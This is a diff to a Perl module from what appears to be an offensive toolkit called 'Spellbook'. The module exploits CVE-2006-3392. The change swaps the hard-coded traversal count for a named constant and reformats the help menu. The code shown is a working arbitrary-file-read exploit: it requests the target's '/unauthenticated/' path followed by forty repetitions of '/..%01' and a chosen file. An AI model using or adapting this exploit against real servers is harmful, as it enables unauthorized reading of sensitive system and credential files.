@@ -5,6 +5,9 @@ package Spellbook::Advisory::CVE_2006_3392 {
 
     our $VERSION = '0.0.1';
 
+    use Readonly;
+    Readonly my $TRAVERSAL_DEPTH => 40;
+
     sub new {
         my ($self, $parameters) = @_;
         my ($help, $target, $file);
@@ -22,19 +25,19 @@ package Spellbook::Advisory::CVE_2006_3392 {
             }
 
             my $user_agent = Spellbook::Core::UserAgent -> new();
-            my $temp      = '/..%01' x 40;
+            my $temp      = '/..%01' x $TRAVERSAL_DEPTH;
             my $request   = $user_agent -> get($target . '/unauthenticated/' . $temp . $file);
 
             return $request -> content();
         }
 
         if ($help) {
-            return "
-                \rExploit::CVE_2006_3392
-                \r=======================
-                \r-h, --help     See this menu
-                \r-t, --target   Define a target
-                \r-f, --file     Define a file to read\n\n";
+            return "\n"
+                . "Exploit::CVE_2006_3392\n"
+                . "=======================\n"
+                . "-h, --help     See this menu\n"
+                . "-t, --target   Define a target\n"
+                . "-f, --file     Define a file to read\n\n";
         }
 
         return 0;
